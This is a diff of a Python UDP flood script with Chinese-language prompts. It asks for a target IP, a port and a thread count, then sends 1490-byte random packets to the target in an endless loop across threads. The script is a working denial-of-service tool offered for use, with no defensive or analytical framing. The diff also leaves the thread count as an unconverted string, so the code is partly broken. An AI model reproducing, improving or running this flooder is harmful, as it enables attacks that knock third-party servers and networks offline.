@@ -19,16 +19,16 @@ print("因为耗能巨高,如果开了显示就等于手机卡死")
 print("同时,家里要有条件才可以将虚拟主机调高")
 print("假设虚拟主机50个,几分钟后1000块就没了 ")
 print("")
-TARGET_IP = int(input("目标IP:"))
-TARGET_PORT = int(input("目标端口:"))
-many = int(input("虚拟主机数量(注意不要太高,除非家里有条件):"))
+ip = input("目标IP:")
+port = int(input("目标端口:"))
+many = input("虚拟主机数量(注意不要太高,除非家里有条件):")
 
 def send_packets():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes_to_send = random._urandom(1490)
     sent = 0
     while True:
-        sock.sendto(bytes_to_send, (TARGET_IP, TARGET_PORT))
+        sock.sendto(bytes_to_send, (ip, port))
         sent += 1
 
 threads = []
